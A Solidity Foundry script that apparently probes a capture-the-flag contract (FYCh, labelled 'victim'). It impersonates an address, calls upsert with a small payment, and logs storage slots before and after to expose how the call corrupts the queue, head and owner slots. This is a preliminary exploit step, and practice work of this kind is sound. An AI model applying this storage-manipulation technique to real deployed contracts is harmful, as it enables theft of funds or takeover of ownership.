// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

contract ContractScript is Script {
    function setUp() public {}

    function run() public {
        FYCh victim = FYCh(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda);

        console.log('before `upsert`');
        printStorage();

        vm.startPrank(0xE6fa91E51B46A62C372114Ba3F6a154f564162B9);
        victim.upsert{value: 6}(0, 0);

        console.log('after `upsert`');
        printStorage();
    }

    function printStorage() internal {
        console.log("slot #0 (Contribution[] queue)");
        console.logBytes32(vm.load(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 0));
        console.log("slot #1 (head)");
        console.logBytes32(vm.load(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, bytes32(uint(1))));
        console.log("slot #2 ( address owner)");
        console.logBytes32(vm.load(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, bytes32(uint(2))));
        console.log("slot before keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e562
        ));
        console.log("slot 0 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
        ));
        console.log("slot 1 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564
        ));
        console.log("slot 2 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565
        ));
        console.log("slot 3 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e566
        ));
        console.log("slot 4 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e567
        ));
        console.log("slot 5 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e568
        ));
        
        // console.logBytes32(vm.load(
        //     0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
        //     0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e569
        // ));
    }
}

interface FYCh {
        function upsert(uint256 index, uint256 timestamp) external payable;
}
